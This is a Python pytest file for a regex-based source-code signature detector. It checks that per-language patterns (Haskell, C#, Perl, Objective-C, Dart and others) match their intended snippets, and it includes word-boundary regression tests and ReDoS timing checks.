    dead_code = HS_RULES["dead_code"]
    func_start = HS_RULES["func_start"]
    assert dead_code.search("-- data OldType = OldType")
    assert not dead_code.search("data OldType = OldType"), "dead_code fired without a comment prefix"
    assert not func_start.search("-- data OldType = OldType"), "func_start hallucinated inside a comment"


def test_haskell_doc_vs_ownership_no_overlap():
    """
    doc's `--\\s*@author` (JSDoc-style tag) and ownership's `--\\s*Author:`
    (Haddock-style field) share the literal word "author" but use different
    conventions and must not cross-fire.
    """
    doc = HS_RULES["doc"]
    ownership = HS_RULES["ownership"]
    assert not doc.search("-- Author: Jane Doe"), "doc incorrectly matched a Haddock Author: field"
    assert not ownership.search("-- @author Jane Doe"), "ownership incorrectly matched a JSDoc-style @author tag"


def test_haskell_regex_execution_symbolic_operator_bug():
    """
    Regression test: `=~` used to be inside the shared \\b(...)\\b wrapper.
    \\b requires a word/non-word transition, but neither `=` nor `~` is a
    word character, so `\\b=~\\b` could only match with no surrounding
    whitespace at either edge (e.g. "x=~y") -- never idiomatic Haskell like
    "text =~ pattern" (spaced on both sides, the only way anyone actually
    writes this operator).
    """
    pattern = HS_RULES["regex_execution"]
    assert pattern.search("text =~ pattern"), "Failed to match the idiomatic spaced form of =~"
    assert pattern.search("makeRegex pat")


def test_haskell_globals_unsafeperformio_bug():
    """
    Regression test: the trailing `[^=]*` between the IORef/TVar/MVar type
    annotation and `unsafePerformIO` blocked crossing the `=` that MUST
    appear before `unsafePerformIO` in any real usage (the binding's own
    `counter = unsafePerformIO ...` line) -- this signature could never
    match a single real occurrence of the exact idiom it exists to detect.
    """
    pattern = HS_RULES["globals"]
    assert pattern.search("counter :: IORef Int\ncounter = unsafePerformIO (newIORef 0)"), (
        "Failed to match the real-world unsafePerformIO global idiom across two lines"
    )
    assert pattern.search("counter :: IORef Int\n{-# NOINLINE counter #-}\ncounter = unsafePerformIO (newIORef 0)"), (
        "Failed to match with a NOINLINE pragma between the signature and the binding"
    )
    assert not pattern.search("counter :: IORef Int\ncounter = newIORef 0"), (
        "Incorrectly matched a plain IORef binding with no unsafePerformIO at all"
    )


# ==============================================================================
# CROSS-LANGUAGE SYMBOLIC-\b SWEEP (companion to #585's haskell =~ fix)
# ==============================================================================
# Found by a systematic scan for the same bug shape as haskell's
# regex_execution `=~` fix and javascript/typescript's encapsulation `#`
# fix: a purely-symbolic alternative (no letters/digits/underscore) wrapped
# in a shared \b(...)\b group. \b requires a word/non-word transition, so a
# symbolic alternative flanked by \b can only match with NO surrounding
# whitespace/punctuation at either edge -- never how real code is
# idiomatically formatted (operators and superglobals are almost always
# spaced or preceded by other punctuation, not bare word characters).
def test_csharp_events_plus_minus_equals_operators():
    """
    Regression test: `+=`/`-=` (event subscribe/unsubscribe) were inside the
    shared \\b(...)\\b wrapper, so they could only match with no surrounding
    whitespace (e.g. "x+=y") -- never idiomatic C# like "MyEvent += handler".
    """
    pattern = LANGUAGE_DEFINITIONS["csharp"]["rules"]["events"]
    assert pattern.search("MyEvent += handler;"), "Failed to match the idiomatic spaced += form"
    assert pattern.search("MyEvent -= handler;"), "Failed to match the idiomatic spaced -= form"
    assert pattern.search("public event EventHandler Clicked;")


def test_perl_ipc_rpc_bridges_system_and_exec_calls():
    """
    Regression test: `system\\s*\\(` and `exec\\s*\\(` both end in a literal
    `(`, so the trailing \\b in the old shared wrapper could never match once
    followed by anything else non-word (a string quote, a variable sigil) --
    meaning `system("ls")` and `exec("ls")`, the two most common forms,
    never matched at all.
    """
    pattern = LANGUAGE_DEFINITIONS["perl"]["rules"]["ipc_rpc_bridges"]
    assert pattern.search('system("ls -la")'), "Failed to match system(...) -- the most common form"
    assert pattern.search('exec("ls -la")'), "Failed to match exec(...) -- the most common form"
    assert pattern.search("my $pid = fork();")
    assert pattern.search("my $out = `ls -la`;")
    assert not pattern.search("mysystem(1)"), "Incorrectly matched 'system' as a substring of another identifier"


def test_livecode_ssr_boundaries_superglobals_and_tags():
    """
    Regression test: `<?lc`, `?>`, and every `$_POST`-style superglobal start
    with a non-word character, so the leading \\b in the old shared wrapper
    could never match once preceded by anything else non-word (a space or
    line start) -- meaning none of those 6 alternatives (everything except
    the plain-word "put header") ever actually matched.
    """
    pattern = LANGUAGE_DEFINITIONS["livecode"]["rules"]["ssr_boundaries"]
    assert pattern.search('put $_POST["x"]'), "Failed to match $_POST in realistic surrounding code"
    assert pattern.search("<?lc\ncode"), "Failed to match the <?lc open tag"
    assert pattern.search("code ?>"), "Failed to match the ?> close tag"
    assert pattern.search('put header "X"')
    assert not pattern.search("computed headers"), "Incorrectly matched 'header' as a substring of 'headers'"


# ==============================================================================
# OBJECTIVE-C: STRICT STRUCTURAL SIGNATURE COVERAGE (Issue #601)
# ==============================================================================
OBJC_RULES = LANGUAGE_DEFINITIONS["objective-c"]["rules"]

_OBJC_SIMPLE_CASES = [
    # (signature, positive snippet, text expected to NOT match / None to skip)
    ("branch", "if (x) { y(); }", None),
    ("structural_boundaries", "@interface Foo : NSObject", None),
    ("safety", "@try { f(); } @catch (NSException *e) {}", None),
    ("safety_bypasses", "__unsafe_unretained id x;", None),
    ("high_risk_execution", "abort();", None),
    ("io", "NSData *d = [NSData dataWithContentsOfURL:url];", None),
    ("state_mutation", "self.value = 1;", None),
    ("dead_code", "// if (debug) { doThing(); }", "// just a note"),
    ("doc", "/** A doc comment */", None),
    ("test", "XCTAssertTrue(x);", None),
    ("concurrency", "dispatch_async(queue, ^{ });", None),
    ("ui_framework", "UIView *v = [[UIView alloc] init];", None),
    ("closures", "^(int x) { return x + 1; }", None),
    ("globals", "[UIApplication sharedApplication];", None),
    ("decorators", "@property (nonatomic, strong) NSString *name;", None),
    ("generics", "NSArray<NSString *> *names;", None),
    ("comprehensions", "[arr enumerateObjectsUsingBlock:^(id obj, NSUInteger idx, BOOL *stop) {}];", None),
    ("scientific", "double r = sqrt(4.0);", None),
    ("reflection_metaprogramming", "objc_msgSend(obj, sel);", None),
    ("ownership", "// @author Jane Doe", None),
    ("planned_debt", "// TODO: refactor this", None),
    ("fragile_debt", "// HACK: temporary workaround", None),
    ("spec_exposure", "// [SPEC-123] implements the contract", None),
    ("ssr_boundaries", "WOResponse *r = [context response];", None),
    ("events", "[center addObserver:self selector:@selector(x) name:nil object:nil];", None),
    ("dependency_injection", "[factory initWithDependency:dep];", None),
    ("macros", "#define MAX_SIZE 100", None),
    ("pointers", "SEL selector = @selector(foo);", None),
    ("memory_alloc", "id obj = [MyClass alloc];", None),
    ("inline_asm", '__asm__ volatile ("nop");', None),
    ("telemetry", 'os_log(OS_LOG_DEFAULT, "started");', None),
    ("debug_prints", 'NSLog(@"debug value");', None),
    ("explicit_casts", "(NSString *)obj", None),
    ("panics_and_aborts", "@throw exception;", None),
    ("thread_sleeps", "sleep(1);", None),
    ("sync_locks", "@synchronized(self) { }", None),
    ("immutability_locks", "const int x = 1;", None),
    ("cleanup", "[obj release];", None),
    ("encapsulation", "@private\nint _secret;", None),
    ("listeners", '[self addObserver:self forKeyPath:@"x"];', None),
    ("test_skip", 'XCTSkip("not ready");', None),
    ("serialization_parsing", "[NSJSONSerialization JSONObjectWithData:data options:0 error:nil];", None),
    (
        "regex_execution",
        "NSRegularExpression *re = [NSRegularExpression regularExpressionWithPattern:p options:0 error:nil];",
        None,
    ),
    ("time_date_logic", "NSDate *now = [NSDate date];", None),
    ("ipc_rpc_bridges", "NSTask *task = [[NSTask alloc] init];", None),
]


@pytest.mark.parametrize("signature,positive,negative", _OBJC_SIMPLE_CASES)
def test_objectivec_signature_positive_and_negative(signature, positive, negative):
    pattern = OBJC_RULES[signature]
    assert pattern is not None, f"objective-c's {signature!r} rule is unexpectedly None"
    assert pattern.search(positive), f"objective-c {signature!r} failed to match its own documented positive case"
    if negative is not None:
        assert not pattern.search(negative), (
            f"objective-c {signature!r} incorrectly matched an excluded/negative case: {negative!r}"
        )


def test_objectivec_args_control_flow_shield():
    """args must not hallucinate control-flow statements as method/function signatures."""
    pattern = OBJC_RULES["args"]
    assert pattern.search("- (void)doThing:(NSString *)name;")
    assert pattern.search("^(int x) { return x; }")
    assert pattern.search("myCFunction(int a, int b) {")
    assert not pattern.search("if (x) {"), "args hallucinated on an if statement"
    assert not pattern.search("while (x) {"), "args hallucinated on a while statement"


def test_objectivec_args_redos_immunity():
    pattern = OBJC_RULES["args"]
    poison = "x" * 40000
    assert_redos_immune(pattern, poison, timeout_sec=3.0)


def test_objectivec_func_start_handles_vertical_method_signatures():
    """Regression guard for the documented 'Vertical Return Type Shield'."""
    pattern = OBJC_RULES["func_start"]
    assert pattern.search("- (void)doThing;")
    assert pattern.search("-\n(void)\ndoThing;")
    assert pattern.search("static int myCFunction(int a) {")


def test_objectivec_class_start_captures_name():
    pattern = OBJC_RULES["class_start"]
    m = pattern.search("@interface MyClass : NSObject")
    assert m is not None
    assert m.group(1) == "MyClass"


def test_objectivec_import_dependency_capture():
    dep_pattern = OBJC_RULES["_dependency_capture"]
    m = dep_pattern.search("#import <Foundation/Foundation.h>")
    assert m is not None
    assert "Foundation/Foundation.h" in m.groups()

    m2 = dep_pattern.search('#import "MyHeader.h"')
    assert m2 is not None
    assert "MyHeader.h" in m2.groups()


def test_objectivec_args_and_macros_no_false_collision():
    """
    Ambiguity check: args's control-flow exclusion list and macros's
    preprocessor-directive list share the literal "if", but args requires
    a bare `if` (excluded, not matched) while macros requires a `#if`
    preprocessor prefix -- neither can fire on the other's intended input.
    """
    args = OBJC_RULES["args"]
    macros = OBJC_RULES["macros"]
    assert macros.search("#if DEBUG")
    assert not macros.search("if (x) {"), "macros incorrectly matched a bare if statement"
    assert not args.search("if (x) {"), "args incorrectly matched a bare if statement as a function signature"


def test_objectivec_ampersand_dual_classification_is_known_not_a_bug():
    """
    `&foo` (address-of) intentionally triggers both bitwise_ops and pointers
    -- the `&` token is genuinely overloaded in C-family syntax for both
    unary address-of and binary bitwise-AND, and disambiguating requires
    real parsing, not a regex fix. This documents the current, accepted
    dual-classification rather than treating it as a bug.
    """
    bitwise = OBJC_RULES["bitwise_ops"]
    pointers = OBJC_RULES["pointers"]
    assert bitwise.search("&foo"), "bitwise_ops no longer matches address-of syntax"
    assert pointers.search("&foo"), "pointers no longer matches address-of syntax"
    assert bitwise.search("a & b"), "bitwise_ops failed on a real binary AND"
    assert not pointers.search("a & b"), "pointers incorrectly matched a spaced binary AND as address-of"


def test_objectivec_at_prefixed_directives_regression():
    """
    Regression test for a systemic bug found across 9 objective-c
    signatures: an `@`-prefixed directive (@try, @catch, @finally,
    @synchronized, @interface, @implementation, @protocol, @end,
    @synthesize, @dynamic, @class, @import, @throw, @private, @protected,
    @package, @author) was wrapped in a shared \\b(...)\\b group. \\b
    requires a word/non-word transition, but `@` is non-word, so the
    leading \\b could never match once `@` was preceded by anything else
    non-word (a space, a line start) -- which is how @-directives are
    always written. None of these ever actually matched real code.
    """
    r = OBJC_RULES
    assert r["branch"].search("@try { f(); }")
    assert r["safety"].search("@catch (NSException *e) {}")
    assert r["structural_boundaries"].search("@interface Foo : NSObject")
    assert r["structural_boundaries"].search("@end")
    assert r["concurrency"].search("@synchronized(self) { }")
    assert r["sync_locks"].search("@synchronized(self) { }")
    assert r["panics_and_aborts"].search("@throw exception;")
    assert r["encapsulation"].search("@private\nint x;")
    assert r["ownership"].search("@author Jane Doe")


def test_objectivec_trailing_colon_selector_regression():
    """
    Regression test for a related systemic bug: a colon-terminated Obj-C
    selector keyword (enumerateObjectsUsingBlock:, performSelector:,
    inject:, initWithDependency:, addObserver:, observeValueForKeyPath:,
    subscribeNext:) was wrapped with a trailing \\b after the literal `:`.
    `:` is non-word, so that \\b only worked when followed by ANOTHER
    non-word character -- true for a plain identifier argument, but false
    for the equally common `@selector(...)` argument form (since `@` is
    also non-word, no boundary exists between `:` and `@`).
    """
    r = OBJC_RULES
    assert r["comprehensions"].search("[arr enumerateObjectsUsingBlock:^(id o) {}];")
    assert r["safety_bypasses"].search("[obj performSelector:@selector(foo)];"), (
        "performSelector: followed by @selector(...) -- the most common real form -- still didn't match"
    )
    assert r["dependency_injection"].search("[factory inject:@selector(x)];")
    assert r["listeners"].search("[c addObserver:@selector(x)];")


def test_objectivec_globals_bracket_message_regression():
    """
    Regression test: `[UIApplication sharedApplication]` and
    `[NSWorkspace sharedWorkspace]` were wrapped in the shared \\b(...)\\b
    group. `[` and `]` are both non-word, so neither the leading nor
    trailing \\b could ever match once flanked by anything else non-word
    (a space, a semicolon, line start) -- meaning these two alternatives
    never actually matched real code.
    """
    pattern = OBJC_RULES["globals"]
    assert pattern.search("id app = [UIApplication sharedApplication];")
    assert pattern.search("id ws = [NSWorkspace sharedWorkspace];")


# ==============================================================================
# PERL: STRICT STRUCTURAL SIGNATURE COVERAGE (Issue #602)
# ==============================================================================
PERL_RULES = LANGUAGE_DEFINITIONS["perl"]["rules"]

_PERL_SIMPLE_CASES = [
    # (signature, positive snippet, text expected to NOT match / None to skip)
    ("branch", "if ($x) { do_it(); }", None),
    ("args", "sub foo ($a, $b) { }", None),
    ("structural_boundaries", "my $x = 1;", None),
    ("func_start", "sub foo {", None),
    ("class_start", "package Foo;", None),
    ("safety", "eval { risky(); }", None),
    ("safety_bypasses", "eval $code;", None),
    ("high_risk_execution", 'system("ls");', None),
    ("io", "open(my $fh, '<', $file);", None),
    ("api", "use Exporter;", None),
    ("state_mutation", "push @arr, 1;", None),
    ("dead_code", "# my $x = 1;", "# just a comment"),
    ("doc", "=head1 NAME", None),
    ("test", "ok(1, 'passes');", None),
    ("concurrency", "my $pid = fork();", None),
    ("ui_framework", "use Template;", None),
    ("closures", "sub { return 1; }", None),
    ("globals", "print $$;", None),
    ("decorators", "sub foo : lvalue {", None),
    ("generics", "ArrayRef[Int]", None),
    ("comprehensions", "map { $_ * 2 } @list;", None),
    ("scientific", "sqrt(4);", None),
    ("reflection_metaprogramming", "bless($self, $class);", None),
    ("import", "use Foo::Bar;", None),
    ("ownership", "# Author: Jane Doe", None),
    ("planned_debt", "# TODO: fix this", None),
    ("fragile_debt", "# HACK: workaround", None),
    ("spec_exposure", "# [SPEC-123] implements the contract", None),
    ("ssr_boundaries", "render('index');", None),
    ("events", "$bus->emit('event');", None),
    ("dependency_injection", "my $c = container();", None),
    ("macros", "BEGIN { }", None),
    ("pointers", "$ref->[0];", None),
    ("memory_alloc", "undef $x;", None),
    ("inline_asm", "use Inline 'C';", None),
    ("telemetry", "$logger->info('msg');", None),
    ("debug_prints", 'print "debug";', None),
    ("explicit_casts", "int($x);", None),
    ("panics_and_aborts", "die 'error';", None),
    ("thread_sleeps", "sleep(5);", None),
    ("bitwise_ops", "$a & $b;", None),
    ("sync_locks", "lock($var);", None),
    ("immutability_locks", "use Readonly;", None),
    ("cleanup", "close($fh);", None),
    ("encapsulation", "state $x;", None),
    ("listeners", "$bus->on('event', sub {});", None),
    ("test_skip", "skip('reason', 1);", None),
    ("serialization_parsing", "JSON::decode_json($json);", None),
    ("regex_execution", "s/foo/bar/;", None),
    ("time_date_logic", "localtime();", None),
    ("ipc_rpc_bridges", "`ls -la`;", None),
]


@pytest.mark.parametrize("signature,positive,negative", _PERL_SIMPLE_CASES)
def test_perl_signature_positive_and_negative(signature, positive, negative):
    pattern = PERL_RULES[signature]
    assert pattern is not None, f"perl's {signature!r} rule is unexpectedly None"
    assert pattern.search(positive), f"perl {signature!r} failed to match its own documented positive case"
    if negative is not None:
        assert not pattern.search(negative), (
            f"perl {signature!r} incorrectly matched an excluded/negative case: {negative!r}"
        )


def test_perl_args_control_flow_shield_and_redos_immunity():
    pattern = PERL_RULES["args"]
    assert pattern.search("sub foo ($a, $b) { }")
    assert pattern.search("my ($a, $b) = @_;")
    assert pattern.search("shift;")
    assert not pattern.search("if ($x) {"), "args hallucinated on an if statement"
    poison = "sub foo (" + "a, " * 40000
    assert_redos_immune(pattern, poison, timeout_sec=3.0)


def test_perl_func_start_vertical_shield_and_name_capture():
    pattern = PERL_RULES["func_start"]
    m = pattern.search("sub foo {")
    assert m is not None
    assert m.group(1) == "foo"

    m2 = pattern.search("sub\nfoo\n{")
    assert m2 is not None
    assert m2.group(1) == "foo", "vertical subroutine shield failed to capture the name across newlines"

    m3 = pattern.search("method bar ($self) {")
    assert m3 is not None
    assert m3.group(1) == "bar"

    poison = "sub" + "\n" * 40000 + "foo {"
    assert_redos_immune(pattern, poison, timeout_sec=3.0)


def test_perl_class_start_captures_qualified_name_and_redos_immunity():
    pattern = PERL_RULES["class_start"]
    m = pattern.search("package Foo::Bar::Baz;")
    assert m is not None
    assert m.group(1) == "Foo::Bar::Baz"

    m2 = pattern.search("class Point;")
    assert m2 is not None
    assert m2.group(1) == "Point"

    poison = "package " + "A::" * 40000
    assert_redos_immune(pattern, poison, timeout_sec=3.0)


def test_perl_import_dependency_capture():
    dep_pattern = PERL_RULES["_dependency_capture"]
    m = dep_pattern.search("use Foo::Bar::Baz;")
    assert m is not None
    assert "Foo::Bar::Baz" in m.groups()

    # HISTORICAL BUG regression: `require` is runtime-evaluated and very
    # frequently scoped inside a conditional or subroutine -- the old `^`
    # line anchor blinded the engine to this common deferred-load idiom.
    m2 = dep_pattern.search("if ($need_heavy) { require Some::Heavy::Module; }")
    assert m2 is not None
    assert "Some::Heavy::Module" in m2.groups()


def test_perl_safety_eval_block_boundary_regression():
    """
    Regression test: `eval[ \t]*\\{` was inside a shared \\b(...)\\b wrapper.
    It ends on the literal `{` (non-word), so the trailing \\b only fired
    when a word character immediately followed the brace -- the far more
    common idiomatic style with a space after `{` (`eval { risky(); }`)
    never matched at all, silently blinding the safety sensor to the
    single most common Perl error-trapping idiom.
    """
    pattern = PERL_RULES["safety"]
    assert pattern.search("eval { risky_call(); }"), "the idiomatic spaced eval-block form still didn't match"
    assert pattern.search("eval{risky_call();}")
    assert pattern.search("eval\n{\n    risky_call();\n}"), "vertical eval-block placement still didn't match"
    assert pattern.search("use strict;")
    assert pattern.search('$x->isa("Foo")')
    assert not pattern.search("my $evaluation = 1;"), "safety incorrectly matched a bareword containing 'eval'"


def test_perl_safety_bypasses_eval_and_goto_boundary_regression():
    """
    Regression test: `eval\\s+(?!\\w|{)` and `goto\\s+\\&` both end on a
    non-word character by construction, so the old shared trailing \\b
    could never be satisfied -- silently dropping the two most common
    dangerous idioms: `eval $code;` / `eval($code);` (string-eval on a
    variable, not a literal) and `goto &$sub;` (dynamic dispatch).
    """
    pattern = PERL_RULES["safety_bypasses"]
    assert pattern.search("eval $code;"), "eval on a bare variable still didn't match"
    assert pattern.search("eval($code);"), "the no-space function-call form of eval still didn't match"
    assert pattern.search('eval "system($cmd)";')
    assert pattern.search("goto &$sub;"), "dynamic goto still didn't match"
    assert pattern.search("goto &sub;")
    assert pattern.search("no strict;")
    # The safe, non-bypass forms must remain excluded.
    assert not pattern.search("eval q{1};"), "incorrectly matched the safe bareword-block eval form"
    assert not pattern.search("eval { safe_call(); }"), "incorrectly matched the safe eval-block form"


def test_perl_globals_magic_variable_boundary_regression():
    """
    Regression test: `$$`, `$@`, `$!`, and `$?` were inside the shared
    trailing \\b group. Each ends on a symbolic, non-word character, so the
    trailing \\b could only fire when a word char immediately followed --
    never true for how these 4 special variables are actually written.
    """
    pattern = PERL_RULES["globals"]
    assert pattern.search("my $pid = $$;"), "$$ (PID) still didn't match"
    assert pattern.search("if ($@) { die $@; }"), "$@ (eval error) still didn't match"
    assert pattern.search("if ($!) { warn $!; }"), "$! (errno) still didn't match"
    assert pattern.search("my $code = $?;"), "$? (child exit status) still didn't match"
    assert pattern.search("print $a, $b;")
    assert pattern.search("my %h = %ENV;")
    assert not pattern.search("my $abc = 1;"), "incorrectly matched $a as a substring of $abc"


def test_perl_listeners_call_form_boundary_regression():
    """
    Regression test: `on\\s*\\(` and `subscribe\\s*\\(` both end in a
    literal `(`, so the shared trailing \\b could only fire when a word
    char immediately followed -- never true for the most common real call
    shape, `on('event', ...)`, where a quote follows the paren.
    """
    pattern = PERL_RULES["listeners"]
    assert pattern.search("$emitter->on('data', sub { });"), "on(...) still didn't match its most common form"
    assert pattern.search("$emitter->subscribe($topic);")
    assert pattern.search("add_listener($cb);")


def test_perl_regex_execution_bareword_variable_ambiguity_regression():
    """
    Regression test: the old `\\s*[/\\W]` delimiter check could be
    satisfied by an ordinary whitespace/punctuation character that has
    nothing to do with a regex delimiter (`\\W` matches any non-word char,
    including plain space) -- meaning an ordinary bareword-named scalar
    (`$s`, `$m`, `$y`) followed by any operator or even just a space was
    misclassified as the `s///`/`m//`/`y///` regex operator.
    """
    pattern = PERL_RULES["regex_execution"]
    assert not pattern.search("$s = 5;"), "incorrectly classified a variable named $s as the s/// operator"
    assert not pattern.search("$m = 10;"), "incorrectly classified a variable named $m as the m// operator"
    assert not pattern.search("my $y = 2026;"), "incorrectly classified a variable named $y as the y/// operator"
    assert not pattern.search("my $tr = 1;"), "incorrectly classified a variable named $tr as the tr/// operator"
    assert pattern.search("s/foo/bar/;")
    assert pattern.search("$str =~ s/foo/bar/;")
    assert pattern.search("tr/a-z/A-Z/;")
    assert pattern.search("m{foo};")
    assert pattern.search("qr/foo/;")
    assert pattern.search("$x !~ /foo/;")


def test_perl_ambiguity_sweep_shared_literals_are_not_bugs():
    """
    Documents 4 pairs the automated ambiguity sweep flagged for sharing
    literal keywords ("sub"/"method"/"class"/"package"): args<->dead_code,
    args<->func_start, class_start<->dead_code, dead_code<->func_start.
    In every case, dead_code's leading `#` comment-prefix requirement
    already fully disambiguates it from the other two (which require the
    keyword NOT be preceded by a comment marker in context), and
    args<->func_start both correctly firing on the *same* real `sub foo (...)
    {` line is intentional overlap, not a false collision -- confirmed
    empirically here rather than trusted from the sweep tool's literal-only
    heuristic.
    """
    args = PERL_RULES["args"]
    dead_code = PERL_RULES["dead_code"]
    func_start = PERL_RULES["func_start"]
    class_start = PERL_RULES["class_start"]

    live_sub = "sub foo ($a, $b) { }"
    assert args.search(live_sub) and func_start.search(live_sub), (
        "both args and func_start should legitimately match the same live sub signature"
    )
    assert not dead_code.search(live_sub), "dead_code incorrectly matched a live (non-commented) sub"

    commented_sub = "# sub foo { }"
    assert dead_code.search(commented_sub)
    assert not func_start.search(commented_sub), "func_start incorrectly matched a commented-out sub"

    live_package = "package Foo::Bar;"
    assert class_start.search(live_package)
    assert not dead_code.search(live_package)

    commented_package = "# package Foo::Bar;"
    assert dead_code.search(commented_package)
    assert not class_start.search(commented_package), "class_start incorrectly matched a commented-out package"


def test_perl_state_mutation_chained_dereference_redos_immunity():
    pattern = PERL_RULES["state_mutation"]
    poison = "$x" + "->[0]" * 40000 + " ="
    assert_redos_immune(pattern, poison, timeout_sec=3.0)


def test_perl_decorators_redos_immunity():
    pattern = PERL_RULES["decorators"]
    poison = ":" + "a" * 40000
    assert_redos_immune(pattern, poison, timeout_sec=3.0)


# ==============================================================================
# DART: STRICT STRUCTURAL SIGNATURE COVERAGE (Issue #578)
# ==============================================================================
DART_RULES = LANGUAGE_DEFINITIONS["dart"]["rules"]

_DART_SIMPLE_CASES = [
    # (signature, positive snippet, text expected to NOT match / None to skip)
    ("branch", "if (x) { return; }", None),
    ("args", "void foo(int x) {", None),
    ("structural_boundaries", "await foo();", None),
    ("func_start", "void foo() {", None),
    ("class_start", "class Foo {", None),
    ("safety", "try { risky(); } catch (e) {}", None),
    ("safety_bypasses", "x!;", None),
    ("high_risk_execution", "exit(1);", None),
    ("io", "File('test.txt').readAsStringSync();", None),
    ("api", "export 'src/foo.dart';", None),
    ("state_mutation", "list.add(1);", None),
    ("dead_code", "// if (x) {", "// just a note"),
    ("doc", "/// This is a doc comment", None),
    ("test", "test('should work', () {});", None),
    ("concurrency", "await foo();", None),
    ("ui_framework", "Widget build(BuildContext context) {", None),
    ("closures", "(int x) { return x + 1; }", None),
    ("globals", "static const x = 5;", None),
    ("decorators", "@override", None),
    ("generics", "List<String> names;", None),
    ("comprehensions", "[for (var x in list) x * 2]", None),
    ("scientific", "math.sqrt(4);", None),
    ("reflection_metaprogramming", "noSuchMethod(invocation);", None),
    ("import", "import 'package:foo/foo.dart';", None),
    ("ownership", "// Author: Jane Doe", None),
    ("planned_debt", "// TODO: refactor", None),
    ("fragile_debt", "// HACK: workaround", None),
    ("spec_exposure", "// [SPEC-123] implements the contract", None),
    ("ssr_boundaries", "Response.ok('hi');", None),
    ("events", "myStream.listen(onData);", None),
    ("dependency_injection", "GetIt.instance.get<Foo>();", None),
    ("macros", "@JsonSerializable()", None),
    ("pointers", "Pointer<Int32> p;", None),
    ("memory_alloc", "malloc.allocate(10);", None),
    ("telemetry", "log.info('message');", None),
    ("debug_prints", "print('debug');", None),
    ("explicit_casts", "x as String;", None),
    ("panics_and_aborts", "throw Exception('err');", None),
    ("thread_sleeps", "sleep(Duration(seconds: 1));", None),
    ("bitwise_ops", "a & b;", None),
    ("sync_locks", "final lock = Mutex();", None),
    ("immutability_locks", "const x = 5;", None),
    ("cleanup", "controller.dispose();", None),
    ("encapsulation", "int _secret = 5;", None),
    ("listeners", "emitter.on('event', cb);", None),
    ("test_skip", "@Ignore('reason')", None),
    ("serialization_parsing", "jsonDecode(response.body);", None),
    ("regex_execution", r"RegExp(r'\d+');", None),
    ("time_date_logic", "DateTime.now();", None),
    ("ipc_rpc_bridges", "Isolate.spawn(entryPoint, message);", None),
]


@pytest.mark.parametrize("signature,positive,negative", _DART_SIMPLE_CASES)
def test_dart_signature_positive_and_negative(signature, positive, negative):
    pattern = DART_RULES[signature]
    assert pattern is not None, f"dart's {signature!r} rule is unexpectedly None"
    assert pattern.search(positive), f"dart {signature!r} failed to match its own documented positive case"
    if negative is not None:
        assert not pattern.search(negative), (
            f"dart {signature!r} incorrectly matched an excluded/negative case: {negative!r}"
        )


def test_dart_args_control_flow_shield_and_redos_immunity():
    pattern = DART_RULES["args"]
    assert pattern.search("void foo(int x) {")
    assert pattern.search("(int x) => x + 1;")
    assert not pattern.search("if (x > 0) {"), "args hallucinated on an if statement"
    assert not pattern.search("while (x) {"), "args hallucinated on a while statement"
    assert not pattern.search("switch (x) {"), "args hallucinated on a switch statement"

    poison_unclosed = "foo(" + "(a)" * 20000
    assert_redos_immune(pattern, poison_unclosed, timeout_sec=3.0)
    poison_deep = "foo(" + "(" * 20000
    assert_redos_immune(pattern, poison_deep, timeout_sec=3.0)


def test_dart_func_start_captures_name_with_modifiers_and_redos_immunity():
    pattern = DART_RULES["func_start"]
    m = pattern.search("void foo(int x) {")
    assert m is not None
    assert m.group(1) == "foo"

    m2 = pattern.search("static external Future<void> bar() {")
    assert m2 is not None
    assert m2.group(1) == "bar"

    m3 = pattern.search("get value() => _value;")
    assert m3 is not None
    assert m3.group(1) == "value"

    assert not pattern.search("class Foo {"), "func_start incorrectly matched a class declaration"
    assert not pattern.search("if (x) {"), "func_start incorrectly matched an if statement"

    poison = "@a.b.c() " * 5 + "static " * 5 + " " * 40000 + "foo("
    assert_redos_immune(pattern, poison, timeout_sec=3.0)


def test_dart_class_start_captures_name_with_modifiers_and_inheritance():
    pattern = DART_RULES["class_start"]
    m = pattern.search("class Foo {")
    assert m is not None
    assert m.group(1) == "Foo"

    m2 = pattern.search("abstract class Base {")
    assert m2 is not None
    assert m2.group(1) == "Base"

    m3 = pattern.search("class Token extends Base implements Comparable {")
    assert m3 is not None
    assert m3.group(1) == "Token"

    poison = "abstract\n" * 5 + "class Foo extends " + "Bar, " * 20000
    assert_redos_immune(pattern, poison, timeout_sec=3.0)


def test_dart_import_dependency_capture():
    dep_pattern = DART_RULES["_dependency_capture"]
    m = dep_pattern.search("import 'package:foo/foo.dart';")
    assert m is not None
    assert "package:foo/foo.dart" in m.groups()

    m2 = dep_pattern.search("part of 'main.dart';")
    assert m2 is not None
    assert "main.dart" in m2.groups()


def test_dart_concurrency_generator_modifier_boundary_regression():
    """
    Regression test: `sync\\*` ended on `*` (non-word), so the shared
    trailing \\b could only fire when a word char immediately followed --
    never true for the real generator-function modifier `sync* { ... }`.
    Unlike `async*` (which happened to still match via the bare "async"
    alternative catching it as a substring), no bare "sync" alternative
    exists, so this one was completely unreachable.
    """
    pattern = DART_RULES["concurrency"]
    assert pattern.search("Iterable<int> foo() sync* { yield 1; }"), "sync* still didn't match"
    assert pattern.search("Stream<int> foo() async* { yield 1; }")
    assert pattern.search("Future<void> foo() async { }")
    assert not pattern.search("int x = 5;")


def test_dart_listeners_call_form_boundary_regression():
    """
    Regression test: `on\\(` ends in a literal `(`, so the shared trailing
    \\b could only fire when a word char immediately followed -- never
    true for the common real call shape `on('event', ...)`, where a quote
    follows the paren.
    """
    pattern = DART_RULES["listeners"]
    assert pattern.search("emitter.on('data', callback);"), "on(...) still didn't match its most common form"
    assert pattern.search("el.addEventListener('click', cb);")


def test_dart_time_date_logic_duration_empty_args_boundary_regression():
    """
    Regression test: `Duration\\s*\\(` ends on `(`, so the shared trailing
    \\b only fired when a word char immediately followed -- true for the
    named-argument form (`Duration(seconds: 5)`) but not the zero-argument
    form (`Duration()`), where `)` follows and the boundary failed.
    """
    pattern = DART_RULES["time_date_logic"]
    assert pattern.search("final d = Duration();"), "the zero-argument Duration() form still didn't match"
    assert pattern.search("Duration(seconds: 5);")
    assert pattern.search("DateTime.now();")


def test_dart_closures_redos_immunity():
    """
    Regression test for a confirmed real O(n^2) ReDoS: the anonymous
    function block alternative's `[^)]*` was unbounded. Against an
    adversarial run of unclosed `(` characters this scaled ~4x per
    doubling of n (0.011s/0.045s/0.179s/0.713s/2.85s at
    n=5k/10k/20k/40k/80k) before being bounded to `{0,300}`.
    """
    pattern = DART_RULES["closures"]
    poison = "foo(" + "(" * 80000
    assert_redos_immune(pattern, poison, timeout_sec=3.0)

    # Correctness must survive the bound.
    assert pattern.search("(int x) { return x + 1; }")
    assert pattern.search("() async { await foo(); }")
